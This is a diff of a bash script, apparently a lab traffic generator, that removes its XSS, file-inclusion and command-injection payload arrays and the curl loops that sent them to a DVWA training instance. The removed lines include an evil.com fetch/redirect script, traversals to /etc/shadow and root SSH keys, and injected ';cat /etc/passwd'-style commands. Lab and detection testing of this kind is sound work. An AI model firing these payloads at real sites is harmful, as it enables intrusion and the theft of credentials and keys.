@@ -27,60 +27,6 @@ declare -a SQLI_PAYLOADS=(
 "1 OR 1=1/*"
 )
 
-declare -a XSS_PAYLOADS=(
-"<script>alert(1)</script>"
-"<img src=x onerror=alert(1)>"
-"<svg onload=alert(1)>"
-"<body onload=alert(1)>"
-"<iframe src=javascript:alert(1)>"
-"<input autofocus onfocus=alert(1)>"
-"<select autofocus onfocus=alert(1)>"
-"<video src=x onerror=alert(1)>"
-"<details open ontoggle=alert(1)>"
-"<marquee onstart=alert(1)>"
-"<script>document.location=http://evil.com</script>"
-"<script>fetch(http://evil.com)</script>"
-"%3Cscript%3Ealert(1)%3C/script%3E"
-"javascript:alert(1)"
-"<ScRiPt>alert(1)</ScRiPt>"
-)
-
-declare -a LFI_PAYLOADS=(
-"../../etc/passwd"
-"../../etc/shadow"
-"../../etc/hosts"
-"../../var/log/apache2/access.log"
-"../../var/log/auth.log"
-"../../proc/version"
-"../../proc/self/environ"
-"../../etc/mysql/my.cnf"
-"../../root/.bash_history"
-"../../root/.ssh/id_rsa"
-"....//....//etc/passwd"
-"../../home/phil/.bash_history"
-"../../var/www/html/dvwa/config/config.inc.php"
-"../../windows/system32/drivers/etc/hosts"
-"../../etc/crontab"
-)
-
-declare -a CMD_PAYLOADS=(
-";ls"
-";whoami"
-";id"
-";uname -a"
-";cat /etc/passwd"
-"| ls"
-"| whoami"
-"| cat /etc/passwd"
-"&& whoami"
-"&& ls"
-"&& id"
-";ls -la /var/www/html"
-";find / -type f -name config"
-";cat /var/log/apache2/access.log"
-";ps aux"
-)
-
 declare -a BRUTE_USERS=(
 "admin" "root" "user" "test" "guest" "administrator" "manager"
 "superuser" "operator" "staff" "dev" "support" "helpdesk" "info"
@@ -136,43 +82,6 @@ for round in $(seq 1 $REPEAT); do
             -d "Submit=Submit" \
             "$DVWA_URL/vulnerabilities/sqli/"
     done
-
-    # --- XSS ---
-    echo "[*] Sending XSS payloads..."
-    for payload in "${XSS_PAYLOADS[@]}"; do
-        COUNT=$((COUNT + 1))
-        curl -s -o /dev/null \
-            -b "$COOKIE_FILE" \
-            -b "security=low" \
-            --get \
-            --data-urlencode "name=$payload" \
-            "$DVWA_URL/vulnerabilities/xss_r/"
-    done
-
-    # --- LFI ---
-    echo "[*] Sending LFI payloads..."
-    for payload in "${LFI_PAYLOADS[@]}"; do
-        COUNT=$((COUNT + 1))
-        curl -s -o /dev/null \
-            -b "$COOKIE_FILE" \
-            -b "security=low" \
-            --get \
-            --data-urlencode "page=$payload" \
-            "$DVWA_URL/vulnerabilities/fi/"
-    done
-
-    # --- CMD INJECTION ---
-    echo "[*] Sending command injection payloads..."
-    for payload in "${CMD_PAYLOADS[@]}"; do
-        COUNT=$((COUNT + 1))
-        curl -s -o /dev/null \
-            -b "$COOKIE_FILE" \
-            -b "security=low" \
-            --data-urlencode "ip=127.0.0.1$payload" \
-            -d "Submit=Submit" \
-            "$DVWA_URL/vulnerabilities/exec/"
-    done
-
 done
 
 echo ""
